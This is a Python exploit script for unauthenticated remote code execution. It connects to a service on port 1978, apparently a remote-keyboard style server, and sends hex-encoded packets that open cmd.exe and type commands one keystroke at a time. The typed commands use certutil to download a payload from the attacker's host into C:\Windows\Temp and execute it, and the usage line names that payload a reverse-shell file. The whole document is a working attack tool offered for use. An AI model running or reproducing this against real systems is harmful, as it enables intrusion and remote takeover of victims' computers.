#!/usr/bin/python3

# Created by @baas on Twitter

from socket import socket, AF_INET, SOCK_STREAM
from time import sleep
import sys

# Constants
PORT = 1978
CMD_PAYLOAD = "6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a"
PACKET_PADDING = "7574663820"
ENTER_KEY_PACKET = "6b657920203352544e"
SLEEP_SHORT = 0.03
SLEEP_LONG = 0.5

# Character to Hex mapping
CHARACTERS = {
    "A": "41", "B": "42", "C": "43", "D": "44", "E": "45", "F": "46", "G": "47", "H": "48", "I": "49", "J": "4a",
    "K": "4b", "L": "4c", "M": "4d", "N": "4e", "O": "4f", "P": "50", "Q": "51", "R": "52", "S": "53", "T": "54",
    "U": "55", "V": "56", "W": "57", "X": "58", "Y": "59", "Z": "5a",
    "a": "61", "b": "62", "c": "63", "d": "64", "e": "65", "f": "66", "g": "67", "h": "68", "i": "69", "j": "6a",
    "k": "6b", "l": "6c", "m": "6d", "n": "6e", "o": "6f", "p": "70", "q": "71", "r": "72", "s": "73", "t": "74",
    "u": "75", "v": "76", "w": "77", "x": "78", "y": "79", "z": "7a",
    "1": "31", "2": "32", "3": "33", "4": "34", "5": "35", "6": "36", "7": "37", "8": "38", "9": "39", "0": "30",
    " ": "20", "+": "2b", "=": "3d", "/": "2f", "_": "5f", "<": "3c", ">": "3e", "[": "5b", "]": "5d",
    "!": "21", "@": "40", "#": "23", "$": "24", "%": "25", "^": "5e", "&": "26", "*": "2a", "(": "28", ")": "29",
    "-": "2d", "'": "27", '"': "22", ":": "3a", ";": "3b", "?": "3f", "`": "60", "~": "7e", "\\": "5c", "|": "7c",
    "{": "7b", "}": "7d", ",": "2c", ".": "2e"
}

def open_cmd(target, rhost):
    """Opens CMD on the target machine."""
    target.sendto(bytes.fromhex(CMD_PAYLOAD), (rhost, PORT))

def send_string(target, string, rhost):
    """Sends a string one character at a time, converted to hex."""
    for char in string:
        hex_char = PACKET_PADDING + CHARACTERS.get(char, "20") + "0a"  # Default to space (' ') if char is not found
        target.sendto(bytes.fromhex(hex_char), (rhost, PORT))
        sleep(SLEEP_SHORT)

def send_return(target, rhost):
    """Sends a 'return' key command."""
    target.sendto(bytes.fromhex(ENTER_KEY_PACKET), (rhost, PORT))
    sleep(SLEEP_LONG)

def exploit(target, rhost, lhost, payload_name):
    """Executes the exploit payload on the target."""
    print("[+] 3..2..1..")
    sleep(2)
    open_cmd(target, rhost)
    
    print("[+] Initiating payload transfer...")
    sleep(1)
    
    payload_url = f"certutil.exe -urlcache -f http://{lhost}/{payload_name} C:\\Windows\\Temp\\{payload_name}"
    send_string(target, payload_url, rhost)
    send_return(target, rhost)
    
    print("[+] Retrieving payload...")
    sleep(3)
    
    exec_payload = f"C:\\Windows\\Temp\\{payload_name}"
    send_string(target, exec_payload, rhost)
    send_return(target, rhost)
    
    print("[+] Exploit complete. Check your listener!")

def main():
    try:
        rhost = sys.argv[1]
        lhost = sys.argv[2]
        payload_name = sys.argv[3]
    except IndexError:
        print(f"USAGE: python3 {sys.argv[0]} <target-ip> <tun0> <rev_shell-file>")
        sys.exit(1)

    target = socket(AF_INET, SOCK_STREAM)
    
    try:
        print(f"[+] Connecting to {rhost}:{PORT}...")
        target.connect((rhost, PORT))
        exploit(target, rhost, lhost, payload_name)
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        target.close()
        print("[+] Connection closed.")
        sys.exit(0)

if __name__ == "__main__":
    main()
